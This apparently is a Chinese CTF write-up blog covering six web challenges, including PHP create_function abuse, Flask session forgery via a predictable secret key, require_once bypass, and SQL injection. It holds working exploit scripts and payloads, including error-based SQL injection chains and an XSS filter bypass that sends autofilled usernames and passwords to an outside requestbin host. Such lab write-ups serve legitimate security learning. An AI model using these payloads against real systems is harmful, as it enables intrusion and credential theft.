<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>0x01:审计</strong></p>
<p>首先利用<code>creat_function</code>创建了一个匿名函数，而eval函数中也实现了对该函数的调用，但是eval中创建的函数名用了<code>openssl_random_pseudo_bytes</code>函数，所以很难进行爆破</p>
<p>但是可以从匿名函数入手，因为create_function创建匿名函数时，该函数的名字会默认为<code>%00lambda_%d</code>，所以我们可以爆破后面的<code>%d</code>执行对应的匿名函数</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3f157adf-697c-4764-b2cc-994d24033869.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;$flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;go! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>

<p>就可以得到flag了</p>
<span id="more"></span>

<h4 id="DDCTF-homebrew-event-loop"><a href="#DDCTF-homebrew-event-loop" class="headerlink" title="[DDCTF]homebrew event loop"></a>[DDCTF]homebrew event loop</h4><ul>
<li>python代码审计</li>
</ul>
<p>打开页面，可以发现url上有不同的地方，然后还告诉了我们的信息：有多少钻石和分数，然后可以在e-shop里面购买钻石，并且可以点击Reset进行重置</p>
<p><img src="https://img-blog.csdnimg.cn/62440506dff64e97b32dab7e58f41e3c.png" alt="img"></p>
<p>之后直接看源码吧：</p>
<p><strong>0x01:审计+解题</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span> <span class="comment"># 获取flag</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br></pre></td></tr></table></figure>

<p>  -<code>trigger_event</code>函数用于将event元素加入session的log和执行队列中，实现对函数的执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span>  </span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event) <span class="comment"># </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: <span class="comment"># 如果log的长度大于5那么只截取最后五位</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]): <span class="comment"># 如果event的类型是列表，那么加入队列</span></span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event) <span class="comment"># 事件队列接入event元素</span></span><br></pre></td></tr></table></figure>

<p>  -<code>get_mid_str</code>函数用于在后面的<code>execute_event_loop</code>函数中截取用于执行的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):] <span class="comment"># 获取prefix所在索引加上prefix长度的值</span></span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] <span class="comment"># 获取postfix前面的字符串</span></span><br><span class="line">    <span class="keyword">return</span> haystack</span><br></pre></td></tr></table></figure>

<p>  -<code>execute_event_loop</code>函数用于执行url中我们用get传入的函数，而我们所利用的也是这个函数，因为我们想要执行多个函数，所以我们要利用trigger_event将我们想要执行的函数放入执行队列中，但是由于eval函数，所以要用%23绕过，之后再在每个要执行的函数之间用#进行分割就实现了多函数调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span> <span class="comment"># 执行url上面的action啦就是</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>: <span class="comment"># 当队列长度大于0时</span></span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># 获取元素</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]  <span class="comment"># 截取队列 索引为1之后的元素</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="comment"># 如果元素不是以xxx为开头，就跳出循环，找下一个event</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="comment"># 过滤被禁止的字符</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span> <span class="comment"># 判断是不是action</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>) <span class="comment"># 获取:之后和;之前的字符串</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>) <span class="comment"># action;之后的字符串 并以#为分隔 返回列表</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>)) <span class="comment"># 执行函数 这里要注意trigger_event的结尾不是handler也不是function，所以如果要调用trigger_event函数，就要绕过</span></span><br><span class="line">                ret_val = event_handler(args) <span class="comment"># 默认为第一个 即;后面的#前面的</span></span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val <span class="comment"># 执行之后的值放入resp中</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>  -<code>buy_handler</code>函数购买钻石，参数为买的钻石的个数，然后买的个数加入session的num_items中，这里的num_items刚好和后面的get_flag函数相应，所以我们要实现num_itemsa&gt;=5，但是还要注意在<code>consume_point_function</code>函数中的报错<code>RollBackException()</code>，这个要求一次购买的钻石个数不能超过3个，所以不能一次性买5个，但是我们可以分次数购买</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>  - 在最后的<code>get_flag_handler</code>函数中可以发现，如果买到的钻石个数大于5的话，就可以执行trigger_enent和FlAG函数得到flag了，并且trigger_event函数会把字符串放入session里面的log中，所以就可以通过看session来得到flag，而从前面也可以发现session被加密了，直接用脚本解密就好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%<span class="number">23</span>;action:buy <span class="number">2</span>;%23action:buy <span class="number">3</span>;%23action:get_flag;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10a5781779e7402c8d844b331f2e37c4.png" alt="img"></p>
<p>base64解密之后得到flag</p>
<h4 id="CISCN2019-Web4"><a href="#CISCN2019-Web4" class="headerlink" title="[CISCN2019]Web4"></a>[CISCN2019]Web4</h4><p>打开页面，点击之后发现直接转到了百度的界面，看url就可以发现着手点了</p>
<p>可能存在ssrf之类的漏洞，直接试着查看<code>/flag</code>，但是返回了hacker，说明flag被ban了</p>
<p>之后查看一些文件也看不出有什么可以利用的，那么就先抓个包吧</p>
<p>发现session的值很想jwt的格式</p>
<p><img src="https://img-blog.csdnimg.cn/69249a08114d405da99883377e9eac70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那就直接去用脚本强制解密一下看看</p>
<p><img src="https://img-blog.csdnimg.cn/3e1de7eb08a7468db3310c29453f2781.png" alt="img"></p>
<p>解密之后发现后面是<code>www-data</code>，那么有可能就是我们要修改session伪造身份，才有资格访问</p>
<p>但是现在有两个问题，一个是不知道真正的用户是什么，然后还有一个是不知道加密的密钥是什么，当然我们可以猜测存在python文件，但是该怎么才能得到源码呢</p>
<p>因为这是一个flask框架，但是尝试之后还是没找到，最后看了别人的wp</p>
<p>（但是不知道为什么</p>
<p><img src="https://img-blog.csdnimg.cn/3c3a6404d09541cf8760f269c9039626.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>之后就可以进行审计啦，根据前面有<code># encoding:utf-8</code>，我们可以猜测是python2的环境（纯个人方法</p>
<p>审计源码之后我们可以发现<code>flag</code>路由，且要实现username为fuck才能读取flag文件，但是接下去还有一个问题就是密钥</p>
<p>重点在于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>百度之后可以知道，random.seed里面的值是种子，存在seed之后，再执行random函数的时候生成的随机数的伪随机数，所以我们可以通过获取seed来知道我们需要的随机数</p>
<p>所以现在的重点在于<code>uuid.getnode()</code>，百度之后发现这个是用来获取mac地址（物理地址）的</p>
<p><img src="https://img-blog.csdnimg.cn/3e3d43e80fee488d9a095e83b4993943.png" alt="img"></p>
<p><a href="https://www.jianshu.com/p/b4102e3e3e96">https://www.jianshu.com/p/b4102e3e3e96</a></p>
<p><img src="https://img-blog.csdnimg.cn/643045d1767940b19f4e01dc5b6889b7.png" alt="img"></p>
<p>所以得到了mac地址（<code>ae:f8:1f:75:7c:c0</code>），而seed里面是十进制，所以要将mac地址转化为十进制：</p>
<p>exp：（注意这里要用python2，因为python3和python2保留的小数位数不同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;ae:f8:1f:75:7c:c0&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp, <span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bba999b0f4094a2f8433a60f8fcb0599.png" alt="img"></p>
<p>之后直接对session加密：</p>
<p><img src="https://img-blog.csdnimg.cn/39ce5103162a43e9940c1c57276c6d34.png" alt="img"></p>
<p>修改session，并访问flag路由得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/40cd32a3d29c4da581a02d6c697168b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF-Make-PHP-Great-Again"><a href="#WMCTF-Make-PHP-Great-Again" class="headerlink" title="[WMCTF]Make PHP Great Again"></a>[WMCTF]Make PHP Great Again</h4><ul>
<li>require_once绕过不能重复包含的限制</li>
</ul>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  require_once $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码很短,知识点是绕过<code>require_once</code>不能重复包含的限制</p>
<p><a href="https://www.anquanke.com/post/id/213235#h2-0">分析</a>（慢慢看</p>
<p><img src="https://img-blog.csdnimg.cn/9938dbfd17074c58a1b8492d7939a72c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF-babyWeb"><a href="#RootersCTF-babyWeb" class="headerlink" title="[RootersCTF]babyWeb"></a>[RootersCTF]babyWeb</h4><ul>
<li>简单的sql注入</li>
</ul>
<p>打开靶机，直接告诉了我们ban了<code>union|sleep|&#39;|&quot;| or |-|benchmark</code>，随便在框里输入数字时会发现这应该是数字型注入，所以被ban掉的引号没有印象</p>
<p><img src="https://img-blog.csdnimg.cn/f72394e1795f44f2bc5ea5632c7c0ed0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>解法一：万能密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 || 1=1 limit 0,1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8a484268e1104f23a9882f36374f1efd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>解法二：手注</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 2</span><br><span class="line">1^updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select uniqueid from users),0x7e),1)</span><br><span class="line"># ~837461526918364526,123456789928466788~  </span><br></pre></td></tr></table></figure>

<p>之后在输入框中输入查询到的uniqueid的值，就可以得到flag了</p>
<p>（注：这里存在一个点，就是过滤了单引号在table_name=’users’中不能使用，可以用十六进制绕过）</p>
<h4 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h4><p>打开靶机，无法注入，但是可以在feedback里面写内容</p>
<p><img src="https://img-blog.csdnimg.cn/93635349daab40f7936d1079951ed897.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>看了源码之后可以发现代码块，这里的黑名单是进行字符串替换的，那我们在被过滤的字符串中间加上cookie就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$feedback</span>))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$blacklist</span> = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos(<span class="variable">$feedback</span>,<span class="variable">$val</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		                <span class="variable">$feedback</span> = str_ireplace(<span class="variable">$val</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$feedback</span>);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>

<p>可以尝试写入<code>&lt;scricookiept&gt;alert(1)&lt;/scrcookieipt&gt;</code>，之后再进行访问，可以发现可能存在xss攻击，但是之后不知道该怎么利用反射性xss攻击去读取flag</p>
<p><img src="https://img-blog.csdnimg.cn/1966826b62964206acb541412d11e7c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后看登陆界面的js源码，账户和密码都被填入了表单，那么猜测flag或许可能是账户或者密码，那么可以构造poc获取密码和账户。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc（这里可以利用requestbin），之后就可以在requestbin那里获取到代码执行的信息，得到flag：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/inpcookieut&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span> <span class="attr">scookierc</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var uname = documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var passwd = documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var res = uname + &quot; &quot; + passwd;</span></span><br><span class="line"><span class="xml">	documcookieent.locacookietion=&quot;http://http.requestbin.buuoj.cn/*/?a=&quot;+res;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

